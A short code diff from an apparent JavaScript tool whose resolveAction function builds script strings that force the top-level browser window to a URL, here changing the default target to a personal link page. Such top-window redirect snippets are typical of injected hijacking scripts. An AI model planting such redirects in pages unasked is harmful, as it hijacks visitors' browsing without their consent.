@@ -10,7 +10,7 @@ const ACTIONS = {
 function resolveAction(action, redirectUrl) {
   const key = String(action || 'redirect').toLowerCase();
   if (key === 'redirect') {
-    const url = redirectUrl || 'https://metixud.xyz';
+    const url = redirectUrl || 'https://guns.lol/metix';
     return 'try{window.top.location.replace(' + JSON.stringify(url) + ');}catch(e){window.location.replace(' + JSON.stringify(url) + ');}';
   }
   if (!ACTIONS[key]) {
